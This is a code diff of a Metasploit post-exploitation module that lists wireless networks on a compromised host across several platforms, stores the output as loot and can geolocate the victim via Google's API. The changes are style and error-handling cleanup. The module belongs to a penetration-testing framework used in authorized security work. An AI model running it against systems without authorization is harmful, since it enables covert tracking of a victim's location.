@@ -17,7 +17,7 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => [ 'Tom Sellers <tom[at]fadedcode.net>'],
-        'Platform' => %w{android osx win linux bsd solaris},
+        'Platform' => %w[android osx win linux bsd solaris],
         'SessionTypes' => [ 'meterpreter', 'shell' ],
         'Compat' => {
           'Meterpreter' => {
@@ -26,6 +26,11 @@ class MetasploitModule < Msf::Post
             ]
           }
         },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
       )
     )
 
@@ -51,7 +56,7 @@ class MetasploitModule < Msf::Post
     raw_networks = listing.split("\r\n\r\n")
 
     raw_networks.each do |network|
-      details = network.match(/^SSID [\d]+ : ([^\r\n]*).*?BSSID 1[\s]+: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal[\s]+: ([\d]{1,3})%/m)
+      details = network.match(/^SSID \d+ : ([^\r\n]*).*?BSSID 1\s+: (\h{2}:\h{2}:\h{2}:\h{2}:\h{2}:\h{2}).*?Signal\s+: (\d{1,3})%/m)
       if !details.nil?
         strength = get_strength(details[3])
         wlan_list << [ details[2], details[1], strength ]
@@ -63,10 +68,10 @@ class MetasploitModule < Msf::Post
 
   def parse_wireless_linux(listing)
     wlan_list = []
-    raw_networks = listing.split("Cell ")
+    raw_networks = listing.split('Cell ')
 
     raw_networks.each do |network|
-      details = network.match(/^[\d]{1,4} - Address: ([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}).*?Signal level=([\d-]{1,3}).*?ESSID:"([^"]*)/m)
+      details = network.match(/^\d{1,4} - Address: (\h{2}:\h{2}:\h{2}:\h{2}:\h{2}:\h{2}).*?Signal level=([\d-]{1,3}).*?ESSID:"([^"]*)/m)
       if !details.nil?
         wlan_list << [ details[1], details[3], details[2] ]
       end
@@ -81,7 +86,7 @@ class MetasploitModule < Msf::Post
 
     raw_networks.each do |network|
       network = network.strip
-      details = network.match(/^(.*(?!\h\h:))[\s]*([\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2}:[\h]{2})[\s]*([\d-]{1,3})/)
+      details = network.match(/^(.*(?!\h\h:))\s*(\h{2}:\h{2}:\h{2}:\h{2}:\h{2}:\h{2})\s*([\d-]{1,3})/)
       if !details.nil?
         wlan_list << [ details[2], details[1], details[3] ]
       end
@@ -94,10 +99,13 @@ class MetasploitModule < Msf::Post
     if wlan_list.blank?
       print_error('Unable to enumerate wireless networks from the target.  Wireless may not be present or enabled.')
       return
-    elsif datastore['APIKEY'].empty?
-      print_error("Google API key is required.")
+    end
+
+    if datastore['APIKEY'].empty?
+      print_error('Google API key is required.')
       return
     end
+
     g = Rex::Google::Geolocation.new
     g.set_api_key(datastore['APIKEY'])
     wlan_list.each do |wlan|
@@ -120,12 +128,12 @@ class MetasploitModule < Msf::Post
     when 'windows'
       listing = cmd_exec('netsh wlan show networks mode=bssid')
       if listing.nil?
-        print_error("Unable to generate wireless listing.")
+        print_error('Unable to generate wireless listing.')
         return nil
       else
-        store_loot("host.windows.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
+        store_loot('host.windows.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')
         # The wireless output does not lend itself to displaying on screen for this platform.
-        print_good("Wireless list saved to loot.")
+        print_good('Wireless list saved to loot.')
         if datastore['GEOLOCATE']
           wlan_list = parse_wireless_win(listing)
           perform_geolocation(wlan_list)
@@ -136,10 +144,10 @@ class MetasploitModule < Msf::Post
     when 'osx'
       listing = cmd_exec('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s')
       if listing.nil?
-        print_error("Unable to generate wireless listing.")
+        print_error('Unable to generate wireless listing.')
         return nil
       else
-        store_loot("host.osx.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
+        store_loot('host.osx.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')
         print_good("Target's wireless networks:\n\n#{listing}\n")
         if datastore['GEOLOCATE']
           wlan_list = parse_wireless_osx(listing)
@@ -151,12 +159,12 @@ class MetasploitModule < Msf::Post
     when 'linux'
       listing = cmd_exec('iwlist scanning')
       if listing.nil?
-        print_error("Unable to generate wireless listing.")
+        print_error('Unable to generate wireless listing.')
         return nil
       else
-        store_loot("host.linux.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
+        store_loot('host.linux.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')
         # The wireless output does not lend itself to displaying on screen for this platform.
-        print_good("Wireless list saved to loot.")
+        print_good('Wireless list saved to loot.')
         if datastore['GEOLOCATE']
           wlan_list = parse_wireless_linux(listing)
           perform_geolocation(wlan_list)
@@ -167,10 +175,10 @@ class MetasploitModule < Msf::Post
     when 'solaris'
       listing = cmd_exec('dladm scan-wifi')
       if listing.blank?
-        print_error("Unable to generate wireless listing.")
+        print_error('Unable to generate wireless listing.')
         return nil
       else
-        store_loot("host.solaris.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
+        store_loot('host.solaris.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')
         print_good("Target's wireless networks:\n\n#{listing}\n")
         print_error("Geolocation is not supported on this platform.\n\n") if datastore['GEOLOCATE']
         return
@@ -183,10 +191,10 @@ class MetasploitModule < Msf::Post
       print_status("Found wireless interface: #{interface}")
       listing = cmd_exec("ifconfig #{interface} scan")
       if listing.blank?
-        print_error("Unable to generate wireless listing.")
+        print_error('Unable to generate wireless listing.')
         return nil
       else
-        store_loot("host.bsd.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
+        store_loot('host.bsd.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')
         print_good("Target's wireless networks:\n\n#{listing}\n")
         print_error("Geolocation is not supported on this platform.\n\n") if datastore['GEOLOCATE']
         return
@@ -205,10 +213,10 @@ class MetasploitModule < Msf::Post
         wlan_list << [mac, ssid, ss]
       end
       if listing.blank?
-        print_error("Unable to generate wireless listing.")
+        print_error('Unable to generate wireless listing.')
         return nil
       end
-      store_loot("host.android.wlan.networks", "text/plain", session, listing, "wlan_networks.txt", "Available Wireless LAN Networks")
+      store_loot('host.android.wlan.networks', 'text/plain', session, listing, 'wlan_networks.txt', 'Available Wireless LAN Networks')
       print_good("Target's wireless networks:\n\n#{listing}\n")
       if datastore['GEOLOCATE']
         perform_geolocation(wlan_list)
@@ -218,9 +226,10 @@ class MetasploitModule < Msf::Post
       print_error("The target's platform, #{session.platform}, is not supported at this time.")
       return nil
     end
-  rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError
-  rescue ::Exception => e
-    print_status("The following Error was encountered: #{e.class} #{e}")
+  rescue Rex::TimeoutError, Rex::Post::Meterpreter::RequestError => e
+    vprint_error(e.message)
+  rescue StandardError => e
+    print_status("The following error was encountered: #{e.class} #{e}")
   end
 
 end
